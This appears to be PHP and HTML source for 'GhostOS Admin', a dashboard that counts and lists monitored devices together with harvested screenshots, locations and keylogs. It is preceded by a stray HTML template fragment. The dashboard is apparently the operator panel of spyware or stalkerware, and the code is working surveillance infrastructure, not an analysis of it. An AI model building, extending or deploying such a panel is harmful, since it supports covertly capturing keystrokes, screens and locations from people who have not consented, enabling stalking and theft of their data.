<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/responsive.css">
    <link rel="stylesheet" href="/assets/css/animations.css">
    <link rel="stylesheet" href="/assets/css/hacker-theme.css">
    <!-- Ajoute les autres CSS selon la page -->
</head>
<body>
    <!-- Ton contenu -->
</body>
</html>
<?php
/**
 * Dashboard administrateur
 */

session_start();
require_once '../config.php';

// Vérifier si admin connecté
if (!isset($_SESSION['admin_id'])) {
    header('Location: login.php');
    exit;
}

// Statistiques
$stats = [
    'users' => $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn(),
    'devices' => $pdo->query("SELECT COUNT(*) FROM devices")->fetchColumn(),
    'online' => $pdo->query("SELECT COUNT(*) FROM devices WHERE is_online = 1")->fetchColumn(),
    'screenshots' => $pdo->query("SELECT COUNT(*) FROM screenshots")->fetchColumn(),
    'locations' => $pdo->query("SELECT COUNT(*) FROM locations")->fetchColumn(),
    'keylogs' => $pdo->query("SELECT COUNT(*) FROM keylogs")->fetchColumn()
];

// Derniers appareils
$devices = $pdo->query("
    SELECT d.*, u.username, u.email 
    FROM devices d
    JOIN users u ON d.user_id = u.id
    ORDER BY d.last_seen DESC
    LIMIT 20
")->fetchAll();
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostOS - Administration</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white">
    
    <div class="flex">
        <!-- Sidebar -->
        <div class="w-64 bg-gray-800 min-h-screen p-4">
            <h1 class="text-2xl font-bold text-green-400 mb-6">GhostOS Admin</h1>
            <nav>
                <a href="dashboard.php" class="block py-2 px-4 bg-gray-700 rounded mb-1">Dashboard</a>
                <a href="users.php" class="block py-2 px-4 hover:bg-gray-700 rounded mb-1">Utilisateurs</a>
                <a href="devices.php" class="block py-2 px-4 hover:bg-gray-700 rounded mb-1">Appareils</a>
                <a href="data.php" class="block py-2 px-4 hover:bg-gray-700 rounded mb-1">Données</a>
                <a href="logout.php" class="block py-2 px-4 hover:bg-red-700 rounded mt-4">Déconnexion</a>
            </nav>
        </div>
        
        <!-- Main content -->
        <div class="flex-1 p-6">
            <h2 class="text-3xl font-bold mb-6">Dashboard</h2>
            
            <!-- Stats cards -->
            <div class="grid grid-cols-3 gap-4 mb-6">
                <div class="bg-gray-800 p-4 rounded">
                    <p class="text-gray-400">Utilisateurs</p>
                    <p class="text-3xl font-bold"><?= $stats['users'] ?></p>
                </div>
                <div class="bg-gray-800 p-4 rounded">
                    <p class="text-gray-400">Appareils</p>
                    <p class="text-3xl font-bold"><?= $stats['devices'] ?></p>
                    <p class="text-sm text-green-400"><?= $stats['online'] ?> en ligne</p>
                </div>
                <div class="bg-gray-800 p-4 rounded">
                    <p class="text-gray-400">Captures</p>
                    <p class="text-3xl font-bold"><?= $stats['screenshots'] ?></p>
                </div>
            </div>
            
            <!-- Derniers appareils -->
            <div class="bg-gray-800 p-4 rounded">
                <h3 class="text-xl font-bold mb-4">Derniers appareils actifs</h3>
                <table class="w-full">
                    <thead>
                        <tr class="border-b border-gray-700">
                            <th class="text-left py-2">Appareil</th>
                            <th class="text-left">Utilisateur</th>
                            <th class="text-left">Modèle</th>
                            <th class="text-left">Statut</th>
                            <th class="text-left">Dernière vue</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($devices as $d): ?>
                        <tr class="border-b border-gray-700">
                            <td class="py-2"><?= htmlspecialchars($d['device_name']) ?></td>
                            <td><?= htmlspecialchars($d['username']) ?></td>
                            <td><?= htmlspecialchars($d['model']) ?></td>
                            <td>
                                <?php if ($d['is_online']): ?>
                                    <span class="text-green-500">● En ligne</span>
                                <?php else: ?>
                                    <span class="text-gray-500">● Hors ligne</span>
                                <?php endif; ?>
                            </td>
                            <td><?= $d['last_seen'] ? date('d/m/Y H:i', strtotime($d['last_seen'])) : 'Jamais' ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    
</body>
</html>
